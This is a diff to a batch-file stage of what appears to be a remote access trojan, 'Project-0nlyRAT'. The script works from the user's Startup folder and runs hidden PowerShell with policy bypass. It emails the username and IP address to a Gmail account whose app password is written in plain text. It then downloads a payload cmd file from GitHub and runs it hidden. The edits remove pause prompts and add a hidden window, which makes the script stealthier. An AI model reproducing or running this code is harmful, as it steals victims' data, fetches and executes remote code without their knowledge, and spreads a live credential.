@@ -9,21 +9,20 @@ set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
 cd %StartupDir%
 
 @rem Initial reconnaissance
-powershell.exe -nop -ep bypass -c "&{$email='defalttests@gmail.com';$password='nkos qxgo yxvo brmr';$subject=\"$env:username logs\";$ip=(Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1'}).IPAddress|Select -Last 1|Out-String;$smtp=New-Object system.net.mail.smtpclient('smtp.gmail.com','587');$smtp.enableSSL=$true;$smtp.credentials=New-Object system.net.networkcredential($email,$password);$smtp.send($email,$email,$subject,$ip)}"
+powershell.exe -nop -ep bypass -w hidden -c "&{Send-MailMessage -from 'defalttests@gmail.com' -to 'defalttests@gmail.com' -subject \"$env:username $((get-netipaddress -addressfamily ipv4^|?{$_.interfacealias -ne 'Loopback Pseudo-Interface 1'}).ipaddress^|select -last 1)\" -body 'test mail' -smtpserver 'smtp.gmail.com' -port '587' -usessl -credential (new-object -typename system.management.automation.pscredential -argumentlist 'defalttests@gmail.com',(convertto-securestring 'nkos qxgo yxvo brmr' -asplaintext -force))}"
+
 
 @rem Download payload
-powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/wget.cmd' -outfile '.\wget.cmd'"
+ powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/wget.cmd' -outfile '.\wget.cmd'"
 
 @rem run the payload
 powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wget.cmd"
-
-pause
 
 @rem move back to saved directory
 cd %InitialPath%
 
 @REM del initial.cmd
-pause
+
 @REM (
 @REM     echo @echo off
 @REM     echo :loop
